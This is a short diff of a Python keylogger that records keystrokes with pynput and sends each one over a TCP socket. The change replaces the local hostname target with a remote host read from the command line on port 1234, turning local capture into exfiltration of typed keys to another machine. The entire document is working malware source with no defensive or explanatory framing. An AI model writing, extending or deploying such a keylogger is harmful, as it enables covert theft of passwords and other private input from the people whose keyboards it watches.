@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import sys
 import socket
 import pynput
 from pynput.keyboard import Key, Listener
@@ -17,7 +18,7 @@ def on_press(key):
     elif key == "Key.esc":
         key = " [Escape] "
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect((socket.gethostname(), 1234))
+    client.connect((str(sys.argv[1]), 1234))
     client.send(key.encode("utf-8"))
 
 
